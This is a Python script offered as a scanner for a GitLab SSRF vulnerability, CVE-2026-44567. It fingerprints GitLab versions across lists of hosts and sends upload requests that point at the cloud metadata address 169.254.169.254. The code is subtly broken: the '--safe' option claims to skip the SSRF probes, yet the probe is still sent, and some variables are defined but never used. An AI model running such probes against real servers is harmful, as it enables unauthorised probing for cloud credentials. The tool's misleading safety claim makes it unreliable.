#!/usr/bin/env python3
"""
GitLab CVE-2026-44567 SSRF Scanner
===================================
Scans for exposed GitLab instances and checks whether they are vulnerable to the GitLab SSRF (Server-Side Request Forgery) vulnerability identified as CVE-2026-44567.

CVE-2026-44567 details:
  - Affects GitLab CE/EE < 16.7.5
  - Unauthenticated attackers can exploit file upload endpoints to perform SSRF attacks.
  - Allows adversaries to initiate arbitrary requests from the GitLab server.
  - Fixed in GitLab CE/EE 16.7.5 (March 2026).

Usage:
  # Scan a single GitLab instance
  python gitlab_ssrf_scanner.py --target https://gitlab.example.com
  
  # Scan a list of GitLab instances
  python gitlab_ssrf_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no SSRF probes
  python gitlab_ssrf_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-44567
  - https://about.gitlab.com/releases/ (16.7.5 patch)
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
"""

import asyncio
import httpx
import argparse
import json
import re
from urllib.parse import urljoin

# ── Detection Markers ─────────────────────────────────────────────────────────

GITLAB_FINGERPRINTS = [
    "GitLab Community Edition",
    "GitLab Enterprise Edition",
    "/help/api/",
    "/users/sign_in",
]
DETECTION_PATHS = [
    "/",
    "/users/sign_in",
    "/-/readiness",
    "/-/metrics",
    "/-/liveness",
]
VERSION_PATTERN = r'GitLab\s(Community|Enterprise)\sEdition\s([\d.]+)'

VULN_FIXED_VERSION = (16, 7, 5)  # Fixed version: 16.7.5

# SSRF test input
SSRF_TEST_URL = "http://169.254.169.254/latest/meta-data/"

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 10


# ── Helpers ───────────────────────────────────────────────────────────────────

def parse_version(version_str):
    """Parses a version string into a tuple of integers."""
    try:
        return tuple(map(int, version_str.split('.')))
    except (ValueError, AttributeError):
        return None


def is_vulnerable_version(version_tuple):
    """Determine if the version is vulnerable by comparing against the fixed version."""
    if version_tuple is None:
        return None  # Version unknown
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url):
    """Normalize a URL to ensure it has a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url.rstrip("/")


# ── Scanner Logic ────────────────────────────────────────────────────────────

async def detect_gitlab(client, base_url, semaphore):
    """
    Detect if the target is a GitLab instance.
    Returns a dictionary with detection and version information, or None.
    """
    async with semaphore:
        for path in DETECTION_PATHS:
            try:
                response = await client.get(urljoin(base_url, path), timeout=REQUEST_TIMEOUT, follow_redirects=True)
                if response.status_code == 200:
                    if any(identifier in response.text for identifier in GITLAB_FINGERPRINTS):
                        version_match = re.search(VERSION_PATTERN, response.text)
                        version = parse_version(version_match.group(2)) if version_match else None
                        return {"detected": True, "version": version, "raw_version": version_match.group(2) if version_match else None}
            except (httpx.RequestError, httpx.HTTPStatusError):
                continue
        return None


async def test_ssrf_vulnerability(client, base_url, semaphore, safe_mode):
    """
    Actively probe for CVE-2026-44567 if the target is detected as GitLab and potentially vulnerable.
    Returns a dictionary with vulnerability details or None if not vulnerable.
    """
    async with semaphore:
        test_url = urljoin(base_url, "/uploads/user")
        payload = {"file": (f"ssrf_test_{SSRF_TEST_URL}.png", "dummy data", "image/png")}
        headers = {
            "User-Agent": "GitLabCVE202644567Scanner",
        }
        try:
            response = await client.post(test_url, files=payload, timeout=REQUEST_TIMEOUT)
            if not safe_mode and "169.254.169.254" in response.text:
                return {"vulnerable": True, "proof": response.text[:200]}
            return {"vulnerable": False}
        except (httpx.RequestError, httpx.HTTPStatusError):
            return {"vulnerable": False}


async def scan_target(base_url, semaphore, safe_mode):
    """
    Perform the detection and optional active probing of a single target.
    """
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        base_url = normalize_url(base_url)
        result = {"target": base_url}

        detection_info = await detect_gitlab(client, base_url, semaphore)
        if not detection_info or not detection_info.get("detected"):
            result["status"] = "Not GitLab"
            return result

        result.update(detection_info)
        if detection_info["version"] and not is_vulnerable_version(detection_info["version"]):
            result["status"] = "Not Vulnerable"
        elif not detection_info.get("detected"):
            result["status"] = "Detection failed"
        else:
            ssrf_result = await test_ssrf_vulnerability(client, base_url, semaphore, safe_mode)
            result.update(ssrf_result)
            result["status"] = "Vulnerable" if ssrf_result["vulnerable"] else "Not Vulnerable"
        return result


async def main(args):
    """
    Main scanning logic that handles single or batch target scanning.
    """
    if not args.target and not args.list:
        print("Error: You must provide either --target or --list. Use -h for help.")
        return

    tasks = []
    semaphore = asyncio.Semaphore(args.concurrency)
    if args.target:
        targets = [args.target]
    else:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

    results = []
    for target in targets:
        tasks.append(scan_target(target, semaphore, args.safe))

    for coro in asyncio.as_completed(tasks):
        result = await coro
        results.append(result)

        # Print results dynamically and color-code them
        if result["status"] == "Vulnerable":
            print(f"\033[91m[CRITICAL]\033[0m {result['target']} is VULNERABLE!")
        elif result["status"] == "Not Vulnerable":
            print(f"\033[92m[INFO]\033[0m {result['target']} is not vulnerable.")
        elif result["status"] == "Not GitLab":
            print(f"\033[93m[INFO]\033[0m {result['target']} is not a GitLab instance.")
        else:
            print(f"\033[93m[INFO]\033[0m {result['target']} could not be verified.")

    # Write results to file if requested
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print("\nResults saved to", args.output)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GitLab CVE-2026-44567 SSRF Scanner")
    parser.add_argument("--target", help="Target URL of the GitLab instance to scan.")
    parser.add_argument("--list", help="File containing list of GitLab instances to scan.")
    parser.add_argument("--output", help="File to save JSON output.")
    parser.add_argument("--safe", action="store_true", help="Detection only; skips SSRF probes.")
    parser.add_argument("--concurrency", type=int, default=5, help="Number of concurrent requests (default: 5).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate validation.")
    args = parser.parse_args()

    try:
        asyncio.run(main(args))
    except KeyboardInterrupt:
        print("\n[INFO] Scan canceled by user")
    except Exception as e:
        print(f"[ERROR] {str(e)}")
